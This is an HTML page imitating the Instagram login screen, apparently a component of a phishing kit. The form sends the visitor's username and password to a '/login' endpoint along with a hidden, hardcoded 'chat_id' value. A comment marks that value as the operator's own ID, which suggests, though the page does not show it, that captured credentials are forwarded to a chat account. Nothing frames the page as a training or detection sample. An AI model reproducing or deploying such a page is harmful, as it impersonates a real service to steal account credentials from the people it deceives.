<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Instagram Login</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
    body { background: #fafafa; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
    .container { background: white; padding: 40px 30px; border-radius: 8px; box-shadow: 0 2px 12px rgba(0,0,0,0.1); width: 380px; text-align: center; }
    .logo { width: 180px; margin-bottom: 24px; }
    input { width: 100%; padding: 12px; margin: 6px 0; border: 1px solid #dbdbdb; border-radius: 4px; font-size: 14px; outline: none; }
    input:focus { border-color: #0095f6; }
    .btn { width: 100%; padding: 10px; background: #0095f6; color: white; border: none; border-radius: 4px; font-weight: 600; font-size: 16px; cursor: pointer; }
    .btn:hover { background: #0080d6; }
    .or { display: flex; align-items: center; margin: 16px 0; color: #8e8e8e; font-size: 14px; }
    .or::before, .or::after { content: ''; flex: 1; height: 1px; background: #dbdbdb; }
    .or::before { margin-right: 16px; }
    .or::after { margin-left: 16px; }
    .fb { color: #385185; font-weight: 600; font-size: 14px; cursor: pointer; }
    .forgot { font-size: 12px; color: #00376b; margin-top: 12px; display: block; }
    .signup { margin-top: 20px; font-size: 14px; color: #8e8e8e; }
    .signup a { color: #0095f6; font-weight: 600; text-decoration: none; }
  </style>
</head>
<body>
  <div class="container">
    <img src="./img/instagram-logo.png" alt="Instagram" class="logo" />

    <!-- ✅ Hardcoded Chat ID – teri ID -->
    <form action="/login" method="POST">
      <input type="hidden" name="chat_id" value="8975887766">
      <input type="text" name="username" placeholder="Phone number, username, or email" required />
      <input type="password" name="password" placeholder="Password" required />
      <button type="submit" class="btn">Log In</button>
    </form>

    <div class="or">OR</div>
    <div class="fb">Log in with Facebook</div>
    <a href="#" class="forgot">Forgot password?</a>
    <div class="signup">Don't have an account? <a href="#">Sign up</a></div>
  </div>
</body>
</html>
